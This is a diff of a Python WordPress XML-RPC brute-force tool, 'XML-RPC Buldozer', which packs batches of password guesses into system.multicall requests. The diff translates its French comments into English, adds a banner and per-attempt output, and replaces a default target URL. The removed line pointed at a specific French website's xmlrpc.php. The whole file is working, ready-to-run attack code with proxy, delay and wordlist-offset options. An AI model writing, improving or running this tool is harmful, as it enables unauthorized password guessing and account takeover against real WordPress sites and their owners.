@@ -4,19 +4,24 @@ from time import sleep
 import urllib3
 from xml.sax.saxutils import escape
 
-# 🔇 Ignore les warnings SSL
+# 🔇 Disable SSL warning
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# === ARGUMENTS ===
-parser = argparse.ArgumentParser(description="Brute-force WordPress XML-RPC via system.multicall")
-parser.add_argument("--user", required=True, help="Nom d'utilisateur à tester")
-parser.add_argument("--wordlist", required=True, help="Fichier contenant la liste de mots de passe")
-parser.add_argument("--url", default="https://www.echangeura7-salon-nord.fr/xmlrpc.php", help="URL de xmlrpc.php")
-parser.add_argument("--batch", type=int, default=20, help="Nombre de tentatives par requête (défaut = 20)")
-parser.add_argument("--delay", type=int, default=0, help="Temps d'attente (en secondes) entre chaque batch")
-parser.add_argument("--proxy", help="Adresse du proxy HTTP(s), ex: http://127.0.0.1:8080")
-parser.add_argument("--startfrom", type=int, default=0, help="Ignorer les X premières lignes de la wordlist")
-parser.add_argument("--stop-on-success", action="store_true", help="Arrêter le script dès qu'un mot de passe valide est trouvé")
+# === TOOL BANNER ===
+print("\n==============================")
+print("   💥 XML-RPC Buldozer 💥")
+print("==============================\n")
+
+# === ARGUMENT PARSING ===
+parser = argparse.ArgumentParser(description="High-speed XML-RPC bruteforce tool for WordPress using system.multicall")
+parser.add_argument("--user", required=True, help="Username to bruteforce")
+parser.add_argument("--wordlist", required=True, help="Password list file")
+parser.add_argument("--url", default="https://target.com/xmlrpc.php", help="URL to xmlrpc.php")
+parser.add_argument("--batch", type=int, default=20, help="Number of attempts per request (default = 20)")
+parser.add_argument("--delay", type=int, default=0, help="Delay between batches (in seconds)")
+parser.add_argument("--proxy", help="Proxy address, e.g. http://127.0.0.1:8080")
+parser.add_argument("--startfrom", type=int, default=0, help="Start from a specific line in the wordlist")
+parser.add_argument("--stop-on-success", action="store_true", help="Stop execution on first valid password found")
 args = parser.parse_args()
 
 XMLRPC_URL = args.url
@@ -24,7 +29,7 @@ USERNAME = args.user
 WORDLIST = args.wordlist
 USER_AGENT = "Mozilla/5.0"
 
-# === TEMPLATE D'UNE REQUÊTE XML-RPC ===
+# === XML-RPC REQUEST TEMPLATE ===
 def generate_call(password):
     safe_user = escape(USERNAME)
     safe_pw = escape(password)
@@ -63,7 +68,7 @@ def build_multicall(passwords):
   </params>
 </methodCall>"""
 
-# === CHARGEMENT DE MOTS DE PASSE AVEC STARTFROM ===
+# === PASSWORD LOADER WITH OFFSET SUPPORT ===
 def load_passwords(path):
     with open(path, "r", encoding="utf-8") as f:
         for i, line in enumerate(f):
@@ -73,16 +78,18 @@ def load_passwords(path):
             if pw:
                 yield pw
 
-# === ANALYSE DES RÉPONSES ===
+# === RESPONSE PARSER ===
 def parse_response(xml, passwords):
     chunks = xml.split("<struct>")[1:]
     for idx, pw in enumerate(passwords):
         if idx < len(chunks) and "faultCode" not in chunks[idx]:
-            print(f"[💥] Success → {USERNAME}:{pw}")
+            print(f"[✅] SUCCESS → {USERNAME}:{pw}")
             return True
+        else:
+            print(f"[❌] FAILED → {USERNAME}:{pw}")
     return False
 
-# === ENVOI D'UN BATCH DE REQUÊTES ===
+# === MULTICALL BATCH SENDER ===
 def process_batch(batch, headers, proxies):
     xml_payload = build_multicall(batch)
     try:
@@ -90,14 +97,14 @@ def process_batch(batch, headers, proxies):
         if response.status_code == 200:
             success = parse_response(response.text, batch)
             if success and args.stop_on_success:
-                print("\n[🛑] Mot de passe valide trouvé, arrêt immédiat demandé.")
+                print("\n[💥] Valid password found, exiting.")
                 exit(0)
         else:
-            print(f"[❌] Erreur HTTP : {response.status_code}")
+            print(f"[❌] HTTP Error: {response.status_code}")
     except requests.exceptions.RequestException as e:
-        print(f"[❌] Erreur réseau : {e}")
+        print(f"[❌] Network error: {e}")
 
-# === MAIN ===
+# === MAIN LOGIC ===
 def bruteforce():
     passwords = load_passwords(WORDLIST)
     headers = {
@@ -114,16 +121,17 @@ def bruteforce():
         count += 1
 
         if len(batch) == args.batch:
-            print(f"\n[🔄] Tentatives {count - args.batch + 1} → {count}")
+            print(f"\n[🚀] Attempting passwords {count - args.batch + 1} → {count}")
             process_batch(batch, headers, proxies)
             if args.delay:
-                print(f"[⏳] Pause de {args.delay}s avant le prochain batch...")
+                print(f"[⏳] Sleeping for {args.delay}s...")
                 sleep(args.delay)
             batch = []
 
     if batch:
-        print(f"\n[🔄] Dernier batch {count - len(batch) + 1} → {count}")
+        print(f"\n[🚀] Final batch {count - len(batch) + 1} → {count}")
         process_batch(batch, headers, proxies)
 
 if __name__ == "__main__":
     bruteforce()
+
